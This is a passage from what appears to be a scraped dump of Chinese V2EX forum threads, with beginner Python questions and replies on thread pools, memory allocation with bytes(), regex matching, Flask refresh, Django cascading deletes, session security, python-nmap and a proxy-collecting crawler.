self.exception)\n\nclass ThreadPool:\n    \"\"\"A thread pool, distributing work requests and collecting results.\n\n    See the module docstring for more information.\n\n    \"\"\"\n\n    def __init__(self, num_workers, q_size=0, resq_size=0, poll_timeout=5):\n        self._requests_queue = Queue.Queue(q_size)\n        self._results_queue = Queue.Queue(resq_size)\n        self.workers = []\n        self.dismissedWorkers = []\n        self.workRequests = {}\n        self.createWorkers(num_workers, poll_timeout)\n\n    def createWorkers(self, num_workers, poll_timeout=5):\n        for i in range(num_workers):\n            self.workers.append(WorkerThread(self._requests_queue,\n                self._results_queue, poll_timeout=poll_timeout))\n\n    def dismissWorkers(self, num_workers, do_join=False):\n        \"\"\"Tell num_workers worker threads to quit after their current task.\"\"\"\n        dismiss_list = []\n        for i in range(min(num_workers, len(self.workers))):\n            worker = self.workers.pop()\n            worker.dismiss()\n            dismiss_list.append(worker)\n\n        if do_join:\n            for worker in dismiss_list:\n                worker.join()\n        else:\n            self.dismissedWorkers.extend(dismiss_list)\n\n    def joinAllDismissedWorkers(self):\n        \"\"\"Perform Thread.join() on all worker threads that have been dismissed.\n        \"\"\"\n        for worker in self.dismissedWorkers:\n            worker.join()\n        self.dismissedWorkers = []\n\n    def putRequest(self, request, block=True, timeout=None):\n        \"\"\"Put work request into work queue and save its id for later.\"\"\"\n        assert isinstance(request, WorkRequest)\n        # don't reuse old work requests\n        assert not getattr(request, 'exception', None)\n        self._requests_queue.put(request, block, timeout)\n        self.workRequests[request.requestID] = request\n\n    def poll(self, block=False):\n        \"\"\"Process any new results in the queue.\"\"\"\n        while True:\n            # still results pending?\n            if not self.workRequests:\n                raise NoResultsPending\n            # are there still workers to process remaining requests?\n            elif block and not self.workers:\n                raise NoWorkersAvailable\n            try:\n                # get back next results\n                request, result = self._results_queue.get(block=block)\n                # has an exception occured?\n                if request.exception and request.exc_callback:\n                    request.exc_callback(request, result)\n                # hand results to callback, if any\n                if request.callback and not \\\n                       (request.exception and request.exc_callback):\n                    request.callback(request, result)\n                del self.workRequests[request.requestID]\n            except Queue.Empty:\n                break\n\n    def wait(self):\n        \"\"\"Wait for results, blocking until all have arrived.\"\"\"\n        while 1:\n            try:\n                self.poll(True)\n            except NoResultsPending:\n                break\ndef func1(domain):\n    cmd = cmd = 'tracert  %s ' % domain\n    try:\n        proc = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE)\n        outroute1, err = proc.communicate()\n    except Exception as e:\n        pass\n    return outroute1\ndef do_something(data):\n    time.sleep(data*5)\n    result = round(random.random() * data, 5)\n    return result\nglobal requests\nglobal getrnum\ndef callfunction(mytaskpool,funname,data):\n    global SimuRunCount\n    requests=makeRequests(funname,data,print_result,handle_exception)\n    for req in requests:\n        global iIndex\n        global iwhile\n        iwhile=iwhile+1\n        iIndex = iIndex + 1\n        mytaskpool.putRequest(req)\n        funargsstr = re.findall(\".*args=(.*) kwargs=.*\", str(req))\n        funnamestr = re.findall(\".*&lt;function (.*) at .*\", str(funname))\n        args=funargsstr[0]\n        funNamet=funnamestr[0]\n        print(\"Work request #funName %s #params %s #id %s added.\" % (funNamet,args, req.requestID))\n    if iIndex==SimuRunCount:\n        while True:\n            try:\n                time.sleep(0.5)\n                mytaskpool.poll()\n                if iwhile == SimuRunCount:\n                    mytaskpool.createWorkers(SimuRunCount)\n                if iwhile== 20:\n                    mytaskpool.dismissWorkers(2)\n                iwhile += 1\n            except KeyboardInterrupt:\n                print(\"**** Interrupted!\")\n                break\n            except NoResultsPending:\n                break\n        iIndex = 0\n        iwhile = 0\n\n        # mytaskpool.wait()\n            #print finshedarrylist\ndef getreuslt(getnum):\n    getresult=[]\n    if getnum&gt;0:\n        if getnum&gt;len(finshedarrylist):\n            getnum=len(finshedarrylist)\n            #print getnum\n        for c in range(0,getnum):\n            getresult.append(finshedarrylist[c])\n        for ritem in getresult:\n            finshedarrylist.remove(ritem)\n    return getresult\n\n\ndef print_result(request, result):\n    requestlist=str(request)\n    funnamestr = re.findall(\".*&lt;WorkRequest funname=&lt;function (.*)at.*\", requestlist)\n    funargstr = re.findall(\".* args=(.*) kwargs=.*\", requestlist)\n    funName = str(funnamestr[0]).replace(' ', '')\n    argslist=str(funargstr[0]).replace(',', '').replace('(', '').replace(')', '')\n    finshExecArray = {}\n    finshExecArray['request'] = request.requestID\n    finshExecArray[\"params\"] = argslist\n    finshExecArray[\"funname\"]=funName\n    finshExecArray['result'] = result\n    print(\"**** Result from request #%s:%s:%s:%s\" % (request.requestID,funName,argslist, result))\n    finshedarrylist.append(finshExecArray)\n# this will be called when an exception occurs within a thread\n# this example exception handler does little more than the default handler\ndef handle_exception(request, exc_info):\n    if not isinstance(exc_info, tuple):\n        # Something is seriously wrong...\n        print(request)\n        print(exc_info)\n        raise SystemExit\n    print(\"**** Exception occured in request #%s: %s\" % \\\n          (request.requestID, exc_info))\nSimuRunCount = 2\nfinshedarrylist=[]\nif __name__ == '__main__':\n    iIndex = 0\n    iwhile = 0\n    requests = None\n    FinishArray=[]\n    mytaskpool = ThreadPool(SimuRunCount)\n    data1 = [((3,), {}), ((5,), {})]\n    callfunction(mytaskpool, do_something, data1)\n    dataurl = [(('www.lessnet.cn',), {})]\n    callfunction(mytaskpool, func1,dataurl)\n    data = [((6,), {})]\n    callfunction(mytaskpool, do_something, data)\n    data = [((7,), {})]\n    callfunction(mytaskpool, do_something, data)\n    print finshedarrylist\n    getreusltlist = getreuslt(SimuRunCount)\n    print getreusltlist\n    print finshedarrylist\n    if mytaskpool.dismissedWorkers:\n        mytaskpool.joinAllDismissedWorkers()\n    print(\"Joining all dismissed worker threads...\")\n</code></pre>\n<p>目前只能等待设定的线程数完成后才执行下一轮，如何更改表示我完成 5 个线程，继续添加等待的任务放入执行队列中。</p>\n</div></div>"], "reply": "3", "tittle": "Python 多线程+队列的问题", "comment": ["直接用 concurrent.futures 类库不就行了，还有你这个排版…", ":-D 我直接复制这段段代码过来的，然后就成这样了。", " 帮你编辑了一下， V2EX 是支持 Markdown 代码高亮的。"]},
{"content": ["<div class=\"topic_content\">````\r<br>import time\r<br>b_time = bytes(int(time.time()))\r<br>print(b_time)\r<br>````\r<br>\r<br>ubuntu 16.04 64bit下，一运行，内存直接爆炸</div>", "<div class=\"topic_content\">不好意思哈，各位，刚入门，敲代码的时候发现这么个有意思的;)</div>"], "reply": "53", "tittle": "Python 的内存泄露，内存直接爆炸", "comment": ["刚刚重启完电脑，表示不作死就不会死…………\r", "这是什么原理啊…………", "bytes 输入数字表示创建一个长度为此数字的缓冲区，\r", "当前时间戳很大，所以缓冲区很大，不就内存溢出了，\r", "那不叫泄露，不要乱写标题", "python3 的 bytes(n) 的意思是，创建一个 size 为 n 的对象", "这就嘬死 不叫泄漏", "申请太多内存了。\r", "\r", "也遇到过，感兴趣的是，为什么没有一个机制强行停止这个操作，当时一执行直接爆炸，按啥都没卵用。", " ulimit", "你先查查啥叫内存泄漏", "oom?", "<a href=\"http://imgur.com/dXfWmDp\"><img src=\"", "\" title=\"source: imgur.com\" /></a>\r", "\r", "\r", "内存：我的内心毫无波动", "应该是内存耗完，不是泄漏", "楼主，要 python 3 吗 ？", "这是个鬼泄露啊，这明显是申请过多好嘛", "1.  你 bytes() 姿势不对\r", "2. 有不爆炸的内存泄露吗？", "我还以为是什么 bug ，原来是自己作死", "确实是自己作死。", "没炸伤就好～", "作死溢出。。", "楼主你穿越回 1970 年 1 月 1 号就没有这个 bug 了", "是啊，这不叫泄露，这叫作死", "也就 1.5 个 G ？其实还好吧", "现在有太多没有计算机背景的“程序员”，对计算机底层一窍不通，并对发明轮子乐此不疲。", "楼主不要太受打击哈，慢慢进步~", " 看完你的回复后在虚拟机试了下 然后 boom~~~\r", " 你试试 py3  我虚拟机 14128MiB 直接爆炸 我不会告诉你我刚刚冷重启的", " 我学计算机的同学都没有当程序员……", " 怎样才是有计算机背景的\"程序员\"?", "win7 4G 内存，只是内存耗尽卡顿一段时间。 \r", "这样看来还是 windows 稳啊", "If it is an integer, the array will have that size and will be initialized with null bytes.\r", "\r", "所以也就是 1486656000 bytes 差不多 1.384556293 GB ，不会炸啊＝。＝", " 不懂你在说什么，我可没说学计算机的都要去当程序员。", " 比如不懂 C （或者 Clang 的）的就可以称为“没有计算机背景”。异或可以这么理解，能把这个称为“内存泄露”的，就是没有计算机背景。", " 学计算机的都不去当程序员，自然只能没有背景的当。我就是你说的那种“程序员”，我学会计法律的，但是我比我认识的大多数学计算机的同学都混得好，可能是因为我学校烂吧。", "这叫内存泄漏……", " python 3.5  一直在跑没死机  （我的不是虚拟机）\r", "\r", "<a href=\"http://imgur.com/B04dVyO\"><img src=\"", "\" title=\"source: imgur.com\" /></a>\r", "\r", "<a href=\"http://imgur.com/a2pgZV8\"><img src=\"", "\" title=\"source: imgur.com\" /></a>\r", "\r", "\r", "没事啊，就是不知道要跑到什么时候 \r", "\r", "楼主，有升级内存的理由了 。", "还能跑完\r", "\r", "<a href=\"http://imgur.com/0nwaf6h\"><img src=\"", "\" title=\"source: imgur.com\" /></a>", "100 年后、 1000 年后的计算机碰到这种场景还会卡顿吗\r", "换句话说，计算机性能的增长能赶上 timestamp 的增长速度吗", " 我可没说计算机背景指的是", "需要 CS 相关教育经历，你缺的是自信。", " 你的 Ubuntu 是日常使用机器码?中文输入在 IDE sublime 上有没有问题", "Traceback (most recent call last):\r", "  File \"<pyshell#5>\", line 1, in <module>\r", "    print(b_time)\r", "MemoryError\r", "\r", "python3.6 就报个内存错误", "难道我用的是假 Python ？还是说我用的假 Linux ？ Fedora 说这锅 Python 不背\r", "\r", " 你想多了，早就根本不虚了。因为有黑科技叫 overcommit 。 kernel 早就看穿了你们分配了这么多内存一定用不完", "python3 测试有效。", " 好吧 我真机试了下 无压力 不过虚拟机刚开始能看到内存狂飙 然后大概是打印时系统挂了", "应该是死在 print 上面", "有意思！弄成恶作剧发给同事、", "Python 3.5.0 (v3.5.0:374f501f4567, Sep 13 2015, 02:27:37) [MSC v.1900 64 bit (AMD64)] on win32\r", "Type \"copyright\", \"credits\" or \"license()\" for more information.\r", ">>> import time\r", ">>> b_time = bytes(int(time.time()))\r", ">>> print(b_time)\r", "Traceback (most recent call last):\r", "  File \"<pyshell#2>\", line 1, in <module>\r", "    print(b_time)\r", "  File \"C:\\Users\\gilot\\AppData\\Local\\Programs\\Python\\Python35\\lib\\idlelib\\PyShell.py\", line 1343, in write\r", "    return self.shell.write(s, self.tags)\r", "OverflowError: cannot serialize a string larger than 4GiB\r", ">>> \r", "\r", "在 process explorer 里面， pythonw.exe 的 private bytes 确实飙升到了 7.3G （我的电脑内存只有 8G ）\r", "操作系统是 win10 pro ，有大概 10 秒钟的时间整个系统没有反应", "怎么爆炸了，一点反应也没有             \r", "```\r", "xyz@debian:~$ python\r", "Python 2.7.9 (default, Jun 29 2016, 13:08:31) \r", "[GCC 4.9.2] on linux2\r", "Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r", ">>> import time\r", ">>> b_time = bytes(int(time.time())) \r", ">>> print(b_time)\r", "1486711277\r", ">>> ls\r", "Traceback (most recent call last):\r", "  File \"<stdin>\", line 1, in <module>\r", "NameError: name 'ls' is not defined\r", ">>> \r", "xyz@debian:~$ \r", "\r", "```", "就像 38 楼说的，我也记得 Linux 下内存或者硬盘空间都可以申请超过实际大小（并不会真的分配给你，感觉炸了说不通啊", "已 get  可以忽悠 有些自大的舍友去调试了", "\r", "这个内存泄漏可能是真的……", "目前内存占用似乎到顶了， print 执行过程中一直保持这个值", "print 完内存占用就回去了，没泄露，只是 print 的 format 过程占用内存稍微大了一点而已", "内存泄露是指程序申请的堆内存没有被正常回收导致内存泄露", "熊叔： boom", "这也叫泄漏？那 malloc(1000000000) 是不是也叫内存泄漏", " 不是日常使用，只是偶尔开开，那个输入中文的话还好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>html 有段循环列表</p>\n<pre><code>&lt;tr&gt;\n&lt;td class=\"xinbz\" height=\"30\"&gt;&lt;input value=\"856252\" name=\"xzid\" type=\"checkbox\"&gt; &lt;a href=\"856252\" title=\"域名:medytL.com\" target=\"_blank\"&gt;aaa.com&lt;/a&gt;&lt;/td&gt;\n&lt;td&gt;6&lt;/td&gt;\n&lt;td align=\"left\" &gt;&lt;font color='#0000ff'&gt;企业&lt;/font&gt;&lt;/td&gt;\n&lt;td&gt;\n企业&lt;/td&gt;\n&lt;td align=\"center\" &gt;&lt;a href=\"/?/130000\" target='_blank' title=\"查看此卖家域名商铺\"&gt;ID:130000&lt;/a&gt;&lt;/td&gt;\n&lt;td align=\"left\" &gt;2017-12-2&lt;/td&gt;\n&lt;td&gt;111元&lt;/td&gt;\n\n&lt;td align=\"center\"&gt;&lt;a href=\"856252\" target=\"_blank\" title=\"进入域名： medytL.com ，购买页面\"&gt;&lt;img src=\"xbt.jpg\" &gt;&lt;/a&gt;&lt;/td&gt;\n&lt;/tr&gt;\n\n\n&lt;tr&gt;\n&lt;td class=\"xinbz\" height=\"30\"&gt;&lt;input value=\"856252\" name=\"xzid\" type=\"checkbox\"&gt; &lt;a href=\"856252\" title=\"域名:medytL.com\" target=\"_blank\"&gt;bbb.com&lt;/a&gt;&lt;/td&gt;\n&lt;td&gt;6&lt;/td&gt;\n&lt;td align=\"left\" &gt;&lt;font color='#0000ff'&gt;企业&lt;/font&gt;&lt;/td&gt;\n&lt;td&gt;\n企业&lt;/td&gt;\n&lt;td align=\"center\" &gt;&lt;a href=\"/?/130000\" target='_blank' title=\"查看此卖家域名商铺\"&gt;ID:130000&lt;/a&gt;&lt;/td&gt;\n&lt;td align=\"left\" &gt;2017-12-2&lt;/td&gt;\n&lt;td&gt;222元&lt;/td&gt;\n\n&lt;td align=\"center\"&gt;&lt;a href=\"856252\" target=\"_blank\" title=\"进入域名： medytL.com ，购买页面\"&gt;&lt;img src=\"xbt.jpg\" &gt;&lt;/a&gt;&lt;/td&gt;\n&lt;/tr&gt;\n\n</code></pre>\n<p>我这段代码只能获取到第一组数据</p>\n<pre><code>get_datas = re.findall(r'target=\"_blank\"&gt;(.*)&lt;\\/a&gt;(.|\\n)*&lt;td&gt;(\\d+)元&lt;/td&gt;', html, re.M);\nprint get_datas;\n</code></pre>\n<p>[('<a href=\"http://uuupk.com\" rel=\"nofollow\">uuupk.com</a>', '\\n', '111')]</p>\n<p>我想获取当前页面所有匹配的，类似\n[('<a href=\"http://aaa.com\" rel=\"nofollow\">aaa.com</a>', '\\n', '111'),('<a href=\"http://bbb.com\" rel=\"nofollow\">bbb.com</a>', '\\n', '222')]</p>\n<p>findall 加了 re.M 还是获取不到多次，代码问题出现在了哪里呢？\n先谢谢了</p>\n</div></div>"], "reply": "6", "tittle": "请教老司机 findall 匹配多次遇到换行出现问题获取不到", "comment": ["你这么写是贪婪匹配，中间你得加问号 (.|\\n)*?", "为何不用 beautifulsoup 呢", "1L 正解，因为匹配的时候会有两种选择('aaa.com', '\\n', '", "', '\\n', '", "', '\\n', '222')就被忽略掉了", "把 re.M 改成 re.S\r", "\r", "re.M == re.MULTILINE  含义是 ^ 和 $ 匹配每一行的开头结尾，而不是整个字符串开头结尾。\r", "re.S == re.DOTALL 表示 . 能够匹配 \\n\r", "\r", "1L 和 3L 并非错误，但是不是标准做法。\r", "2L 其实给出了相对更好的答案，解析网页还是上 BeautifulSoup 更好。", "好吧，审题不清。 1L 和 3L 的 .*? 还是必要的。加上 re.S 你就不用 (.|\\n)*? 了。", ".*+ 后面加一个 ？ 表示匹配最少的结果～"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在只有在 render_template 的时候才会刷新数据</p>\n<p>有没有什么比较简单的方法实现每 1 个小时刷新一次？</p>\n</div></div>"], "reply": "15", "tittle": "flask 如何实现网页定时自动刷新？", "comment": ["Flask 只是个 web 后台框架", "要自动刷新的话，前端用 js 写个轮询就好了", "前端写个 js ， setTimeout", "可以不用 js 。暴露年龄的 Refresh 头：\r", "拥抱 websocket", "js 写个 setTimeout 是最简单的，两行代码的事。", " meta refresh 才一行代码，怎么破", " \r", " \r", " \r", "\r", "数据都是后台提供的，需要链接数据库，只在前台刷新没用处吧", " 不是每个请求都 render_template 吗？", " 怎么办，我第一次知道原来可以用 JS 做…………\r", "真是后端呆太久了", "用 firebase 数据一更新就能刷新", "试试 celery", " 既然你数据是后台提供，前台刷新难道不是重新请求吗？", "不知道是否符合楼主需求：\r", "flask-cache\r", "自己做一个逻辑，先取 cache ，取不到就生成新的数据，然后放 cache 里，然后再从 cache 返回数据", "从轻量到重量：浏览器插件=》 html refresh =》 setInterval =》 websocket", "js setInterval 走 xhr 啊。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://docs.python.org/3/library/stdtypes.html#frozenset\" rel=\"nofollow\">https://docs.python.org/3/library/stdtypes.html#frozenset</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "第一次听说 Python 还有 frozenset 这东西。。。", "comment": []},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://github.com/intohole/xspider\" rel=\"nofollow\">https://github.com/intohole/xspider</a> 只为了精小而生， 如果遇到什么问题，可以直接留言给我 ， 我会 fix 的</div>"], "reply": "7", "tittle": "一个小爬虫框架， 没有什么高大上的，只是精小，架构清晰， 如果有需求的可以联系我；", "comment": [" 30ra0co75q\r", "\r", "这个 X ？", "\r", "\r", "不能回复图片了。。。", "嗯 是这个 ， 可以看看， 只是写了一个小架构 ， 根据 scrapy 那种流程来的", "楼主 这个 readme 真的不是 rst 格式的么", " markdown", " \r", ":::python\r", "咦？", " 这个是我注释用的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有个疑惑， django 设置 on_delete =models.CASCADE 好像没作用</p>\n<p>class User(models.Model):\nemail = models.CharField(max_length=100, unique=True)\npassword = models.CharField(max_length=100)\ncreate_time = models.DateTimeField(auto_now_add=True)</p>\n<p>class Session(models.Model):\nuser = models.ForeignKey(User, on_delete=models.CASCADE)\ntoken = models.CharField(max_length=100, unique=True)</p>\n<p>数据库是 mysql ，默认引擎 innodb,\nmigrate 之后并没有看到对应的表有设置 ON DELETE 属性 而且我如果先删除主表会提示\nerror ERROR 1451 (23000): Cannot delete or update a parent row: a foreign key constraint fails\n另外， django 也不支持 on_update ?</p>\n<p>我试着进数据库手动添加了 ON DELETE 　 CASCADE ，是可以的\n那么， models 的这个 on_delete 属性有什么意义呢。</p>\n</div></div>"], "reply": "4", "tittle": "django on_delete 级联删除不生效么？", "comment": ["连文档都不读吗?\r", "\r", "Cascade deletes. Django emulates the behavior of the SQL constraint ON DELETE CASCADE and also deletes the object containing the ForeignKey", " 我意思是设置 on_delete 为 CASCADE, 并未生效，到数据库查看表的属性并没有相应地改变。我看网上也有类似的疑问，但官方文档上写着是支持 CASCADE 的，所以过来问下。", " Django **emulates** the behavior of\r", "\r", "是在应用层做的 ON DELETE CASCADE, 不是 db 层", " 谢谢，我再看看"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>啃《 Python 学习手册》时不时因为一些不懂的概念中断学习，一个人学习太枯燥，难以持之以恒。搞了个微信群，大家一起讨论，相互监督学习，期待大神进群指点</p>\n<p><img alt=\"image\" src=\"https://img3.doubanio.com/view/group_topic/large/public/p67733905.jpg\"></p>\n</div></div>"], "reply": "27", "tittle": "初学者学习 Python 的困惑", "comment": ["搞微信群就证明你已经走歪了！", "初学者如果能找到志同道合的人，要是能得到大牛的指点，那你是幸运的", "学习本来就是枯燥的事，微信群讨论效率低下，有什么问题在 V 站发帖讨论不是更好么？", " 感觉在网上发帖不够 即时，微信群也算是一种补充方式吧。", "技术本身是枯燥的，如果带有目的性的去学，动力就足，比如学习一点内容后就搞个小项目练手", "大神肯定不会进群指导，菜鸡互啄的话效率还是太低。", "善用搜索，初学者的问题几乎都能解决", "Google 搜啊，真的解决不了的问题比例很小的，如果遇到了，在这里问一下就行了\r", "微信群顶多用来分享一些消息、资源，增进感情", "Python 学习手册好像只是讲语法的吧，纯语法看起来当然枯燥，其实刚开始不用抠语法细节，大体知道函数怎么用，面向对象怎么写，能看懂别人代码参考一下就差不多了。\r", "\r", "我推荐 head first python 和廖雪峰的教程，都是简单的语法结合实例，后者还有很多读者留言，可以互相交流。只是廖雪峰最后的大作业有点难度，语法懂了的话还不如去看 Django 的官方实例。", "图挂了...最近正好在看 python", "基本上还是个效率 /成本问题，一对一辅导、培训班、自学看书、搜索交流都是解决某一类问题的方法，早期有人系统性的讲授对初学者还是有好处的，私教、培训班、看书 - 成本依次递减，效率自然不同；有基础之后，特别是自己越来越深入某一方面的工作，再找那种通才培训的老师就没有什么效果的，搜索交流或许是高效之道。在初期靠搜索，是你根本不知道搜什么，坑在哪里，有个指路人当然节省不少时间，提高学习效率，你可以衡量小你支付的成本和收效之间的得失，如果你时间多，慢慢摸索吧，想快点进步，付钱请个老师、或者上课去，花钱买时间。", " 网上发帖虽然慢，但是也留下时间可以让自己好好思考问题", "呵呵一笑，還微信群，得了吧。", "《 python 编程快速上手-让繁琐的工作自动化》，简单实用。", "用 flask 做过博客，然后读一遍 flask 的源码应该就差不多了", "微信群容易变成驾校, 楼主自重", "据我所知，一般微信群很容易成为吹水，斗图，问初学者该看什么书，拿红包等等...", "写个 Django 的博客，弄一堆数据分析一下，写个简单的游戏，折腾个脚本，感受算法之美。随便用 Python 做点事情，你会发现自己要学的还是很多", " 一群工程师组建的面向初学者的 python Linux 学习群， 278529278 ，非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", "图挂了，我也在看 Python 学习手册", "coursera 走一波， mit 6.00x 刷一下，不算太枯燥", "进来之前，我想这里会有问题，没想到是微信群招人的。。。 :(", " 哦呵呵，我本来以为搞程序私教是我的首创，没想到 XD 已经想到了啊。。。", "本页面右上角有推荐学习数目，顺着往下看还有编程风格。。。。\r", "别提什么群了。。。。。", "花钱找人指点路子\r", "自己慢慢摸索 爬坑 掉坑 爬坑。。。♻️", "Python 学习手册 那书不行", "py 基础教程啊。指望微信群监督？别逗了好么"]},
{"content": ["<div class=\"topic_content\">去年下半年刚刚读完廖雪峰老师的 Python 教程，虽然有许多点和东西还不是很懂而且最后的实战也没做，但是咬咬牙还是把教程啃下来的。后面陆陆续续又看了看官方文档和笨方法学 Python 。但是感觉书里有些地方还是有点理解不能。\r<br>我该不该把狗书啃到底\r<br>还是配套一些其他书去撸</div>"], "reply": "28", "tittle": "新人问一个关于学习路径的问题", "comment": ["看书没大用.\r", "不信你去面试一下就知道啦.", "是不是可以看一些侧重于实战的书", " \r", " \r", "有写过一些爬虫\r", "现在想试试实战练练手\r", "那么狗书适合么？", "还以为是学习 PS 钢笔路径", "看书唔卵用 请撸起袖子。。。", "好了我把袖子撸起来了 我要去干了！我先定个目标：把自己 blog 从 hexo 转换为 flask 。谢谢诸君指点！！！\r", " \r", " \r", "我最煩 flask,好好的 django 為什麼不用。學編程到底是為了什麼？如果要創造價值，為什麼要跳一些沒有意義的坑。如果是為了滿足自己對語言的好奇，那為什麼不好好看看官方手冊和 cpython 的實現？", " 那什么有用呢？", "学而不思则罔 思而不学则殆", " 意识到自己现在正在罔罔罔了", "Anhedonia, is the inability to experience pleasure from activities usually found enjoyable. -wikipedia\r", "妹纸，你需要大力", " 不用 django 也就算了, 国内那帮 flask 粉还整天喜欢弄点无中生有的东西来贬低 django, 鼓吹 flask.", "建议你把廖雪峰的实战做了。", " 嗷嗷 好的好的 看上去很难 但是我会努力尝试的", " 居然真的有人查这个词什么意思了", "crossin 的编程教室里有很多习题，写的也足够傻瓜，看着你应该就能做出来吧~", " 没去看过 但是有在 codewars 做一些习题 感觉还可以", "也许有些地方你实在「理解不能」需要去看完整的 C 源码实现，但毕竟你的目的不是去 Hacking 或者其他什么的，所以还不如通过轮子学，或者完成一些需求，知乎里有个 list 你可以去搜一下，随着深入再去理解更深的。 btw Python 现在算很万金油，各种包啊框架不胜枚举，所以想玩什么都基本可以。", " 讲道理的话，用 flask 来重写 blog 是比 Django 更好的选择.", "首先学会面向工资编程吧~", " 大一", " 好羡慕。 python 可以做很多事情，先确定你想往哪个方向发展，然后在校期间多读优秀开源项目源码，比看些教程死记硬背有用得多", " \r", " \r", " \r", "有时候一深入看看\r", "感觉完全是懵逼的\r", "\r", "现在看廖雪峰的实战就是懵逼的\r", "完全不知道写得这都什么玩意", "刷题吧~  再补些数据库 ， 计算机网络 ，操作系统 方面的知识就可以了", "连 v 站都开始充斥读书无用论了。。。", " 廖雪峰的教程有些内容其实对小白并不是非常友好，像一些高阶函数装饰器这些。你可以找 python 基础教程这本书看看。然后再看看 python 核心编程这本书。再回过头来看廖雪峰的教程，把实战做了。慢慢来，楼主其实已经在规划上领先别人一步了，想自己当时大一简直就是愣头青，都没想好自己未来要干啥，都在忙着上酱油课，打游戏，打篮球，，", " 这两本书也简单撸了一下下\r", "Python 有关的书目前基础类的都撸了一些了，但是不透，因为感觉有些地方太尼玛难了😂而且短期貌似还用不上 就没有继续啃\r", "我现在回头好好读读", " 一开始以为是个有意思的名字，原来是个单词。话说很羡慕会编程的人， ta 们有种造物主的感觉。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家有用过 python-nmap 吗？我最近想用 flaskWeb 做个小监控，发现用 python-nmap0.6.1 会有异常提示 nmap.nmap.PortScannerError: 'nmap program was not found in path',是不是因为我用的是 python3.X 的原因，如果是的话，有没有支持 python3 的扩展？</p>\n</div></div>"], "reply": "7", "tittle": "Python 使用 nmap 扩展问题", "comment": ["看着是需要调用外部命令的吧 你看看把 nmap 在系统上装一下 并保证在$PATH 能找到", " 对哦，我都没装 nmap =_=!", " 不过装了 python-nmap 还需要额外安装 nmap 的吗？", "python-nmap: python class to \"\"\"use nmap\"\"\" and access scan results", "Orz", "这个。。。。木看文档啊", "这个要先安装 nmap package 会调用系统的 nmap 工作。"]},
{"content": ["<div class=\"topic_content\">之前爱微帮的文章直接可以看，现在必须得登陆才能阅读全文，而且跳转到 <a target=\"_blank\" href=\"http://weixin.sogou.com\" rel=\"nofollow\">weixin.sogou.com</a> 。</div>"], "reply": "目前尚无回", "tittle": "爱微帮跟微信合作了吗？", "comment": []},
{"content": ["<div class=\"topic_content\">今天重看 session 和 cookie 两种缓存的关系，有一个疑问： session id 既然是保存在 cookie 里，那么如果 cookie 被截取， session id 不也一起有了，那 session 还如何保证其安全性呢。\r<br>\r<br>在网上也没找到一个靠谱的答案，在 Q 群里问了下，有大神回答说是因为：是被非对称加密的，没有私钥是解不出来。。感觉听完还是云里雾里的，不是特别懂。。情人节的夜晚，有没有老司机来帮忙解答下，如果能通俗点就更好了\r<br>\r<br>谢谢</div>"], "reply": "10", "tittle": "问一个关于 django 中 session id 的安全性问题", "comment": ["1.session 只有 id 在 cookie 里。确实能通过偷 cookie 的方式偷 session ，但是客户端永远看不见 session 的具体内容。而 cookiesession 是可以看见的。一般会签名，避免客户端篡改。也有加密的。但是 session 内容毕竟是存在客户端，不符合安全原则。\r", "2. cookie session 大小有限制，而且会产生很多不必要的流量。因为浏览器每个请求都会发送所有 cookie 。", " rails 的 session 默認存儲在 cookie 裏，但是有加密的", "django 的 session id 就是一个随机 id 。防止 csrf 攻击的是另外一个叫做 csrf_token （具体什么名字有点忘了）的自定义 http header 来保证的。", "问的好\r", "所以有两种方法\r", "（ 1 ） https ，这要都被偷听了要检讨你网络得多烂了\r", "（ 2 ）类似 oauth ，用户会用一个私钥 hash 所有的参数，他可以拿到 cookies 但是拿不到用户的私钥，自然也不能每次都计算出 hash", "要保证安全性，\r", "1 是避免 cookie 被截取，设置 cookie 的 secure flag ，使其只在 HTTPS 连接中传输\r", "2 敏感操作再次验证用户帐号密码", "不知道你说的 cookie 被截取具指什么。\r", "因为 Django 的 session cookie 默认是 HTTPOnly 的，所以普通的 XSS 偷 cookie 很难奏效。\r", "确实存在获得 sessionid 就能拥有登陆状态这个问题，会话劫持，但 session 里边的内容是不可能知道的，防止劫持也可以有很多方案，比如浏览器的跨域，比如 HTTPOnly 可以防止浏览器本地被修改,比如 https 可以防止传输过程中窃取，比如没过一段时间刷新成新的 id 等等", " 谢谢，对于这个概念明朗了许多", "1. 你确实可以通过拿到 cookieid 来获取到 sessionid\r", "2. 就算你拿到了， session 数据存储到服务端，而且大部分都是内网的，你怎么去获取吗？", " 我的理解：并不是为了获取 session 里的数据，而且通过伪造身份来提高权限，比如未登录的用户伪造登录或者伪造管理员权限。来对网站做出一些损害"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>听说开源才能走的更高更远，才能让自己成长，所以尝试自己写的爬虫代理框架 IPProxyTools 。各位大神轻喷。</p>\n<p>使用 scrapy 爬虫抓取代理网站，获取大量的免费代理 ip 。过滤出所有可用的 ip ，存入数据库以备使用。</p>\n<p>github 地址： <a href=\"https://github.com/awolfly9/IPProxyTool\" rel=\"nofollow\">https://github.com/awolfly9/IPProxyTool</a></p>\n</div></div>", "<div class=\"topic_content\">很多人收藏，却很少人回复\r<br>\r<br>[<a target=\"_blank\" href=\"http://i.imgur.com/Ck6yQ7O.jpg\"><img src=\"http://i.imgur.com/Ck6yQ7O.jpg\" class=\"embedded_image\"></a>]</div>"], "reply": "43", "tittle": "听说今天情人节。开源一个爬虫代理框架，各位大神轻喷", "comment": ["抓代理很有用，学习了", "mysql 是不是有点重，有没有考虑 sqlite ？", "已 star", "有了可用 ip list 之后， 怎么用户爬虫本身去轮流循环替换代理？", " 最开始就是尝试用的 splite ，后来改成 mysql 是为了数据更长久的保存，以及后续分布式部署。\r", "\r", " 如果有什么问题，请给我反馈\r", "\r", " 目前的做法是从服务器端口获取到 ip list 之后，在 scrapy 请求的 Middleware 中循环从 ip list 